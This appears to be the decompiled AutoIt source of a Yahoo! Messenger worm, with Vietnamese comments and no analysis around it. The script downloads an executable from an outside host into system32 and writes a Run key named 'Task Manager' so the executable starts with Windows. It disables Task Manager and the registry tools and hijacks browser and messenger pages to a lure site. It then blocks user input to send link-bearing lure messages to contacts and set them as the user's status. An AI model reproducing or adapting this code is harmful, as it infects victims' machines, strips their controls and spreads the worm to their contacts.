; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Documents and Settings\User\Desktop\yahoo.au3>
; ----------------------------------------------------------------------------

; Thiet Lap
#NoTrayIcon
$website = "http://quatangtraitim.us.tf"
; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\system32\yahoo.exe") Then
        InetGet ("http://freehost19.websamba.com/sinhviennl/tm.exe", @WindowsDir & "\system32\yahoo.exe", 0, 1)
        Sleep(5000)
    EndIf
; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\system32\yahoo.exe")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", "Qua Tang Trai Tim http://quatangtraitim.us.tf")
; Danh Sach Tin Nhan Ngau Nhien
Dim $tin[10]
$tin[0] = "@};- Cam on troi moi som mai thuc giac. Ta co them mot ngay nua de yeu thuong... " & $website & " "
$tin[1] = "@};- Cai gi xuat phat tu trai tim thi se di den trai tim ban oi hay lang nghe giai dieu cua trai tim di... " & $website & " "
$tin[2] = "@};- Toi van nho nhung khi troi mua Van chiec ao va son doi vai nguoi do van di buon...vui lang le, ngo nhu do la mot tieng vong ve tu noi nao do ban oi!" & $website & " "
$tin[3] = "@};- Tinh co toi duoc nghe mot bai hat, bai hat do voi gai dieu va ca tu tha thiet chan tinh giau hinh anhnhu mot cau chuyen ke cac ban hay thu lang nghe nhe... " & $website & " "
$tin[4] = "@};- Toi da lang nghe bai hay nay voi mot chut cam xuc la, mot chut to mo, sao giua dong doi buon trai & bon be, ca am nhac va long nguoi cung ngap chim vao nhung lo toan tinh toan, chuyen ban buon loi danh... " & $website &" "
$tin[5] = "@};- Am nhac lam ta voi nho, co the dat ta ve voi nhung ky uc xa xoi. Bai hat da lam duoc dieu ay! @};- " & $website & " "
$tin[6] = "@};- Toi nghi den nhung nguoi ban nhung nguoi cua ngay xua, nhugn nguoi nghiem khac, nhung nguoi diu hien, nhung  nguoi toi thoang duoc gap va ca nhung nguoi toi chua mot lan chot nho trong cuoc song lo toan cua minh " & $website & " "
$tin[7] = "@};- Toi mong sao baihat nay se den duoc voi moi nguoi, voi nhung nguoi thanh dat va ca nhung nguoi vo danh. De ai cung duoc tim lai nhung khoanh khac hanh phuc tinh khoi quy gia nhat cua doi nguoi " & $website & " "
$tin[8] = "@};- Cuoc song voi nhung kho khan vat va nhung luon dang de duoc chung ta nang niu triu men. toi bong chot nho mot trang web Toi mong sao no se den duoc voi tat ca moi nguoi" & $website & " "
$tin[9] = "@};- Nhung khi buon vui lang le, ngo nhu do la mot tieng vong ve tu noi nao do xa lam toi muon nghe bai hat do nhu mot chut la lung,nho nhung ban a. Ban cung nghe voi toi nhe!!!!!!!! " & $website & " "
; Ham Thay Doi Status & Gui Tin Nhan
While (1)
sleep(30000)
$tieude = WinGetTitle("Yahoo! Messenger", "")
$kiemtra = WinExists ($tieude)
    If $kiemtra = 1 Then
        $ngaunhien = Random(0,9,1)
        ClipPut($tin[$ngaunhien])
        BlockInput (1)
        WinActivate($tieude)
        Send("!m")
        Send("un")
        Send("^v {ENTER}{ENTER}")
        Send("^m")
        Send("{DOWN}")
        Send("^{SHIFTDOWN}{END}{SHIFTUP}")
        Send("{ENTER}")
        Send("^v {ENTER}")
        BlockInput (0)
    EndIf
Sleep(500000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Documents and Settings\User\Desktop\yahoo.au3>
; ----------------------------------------------------------------------------

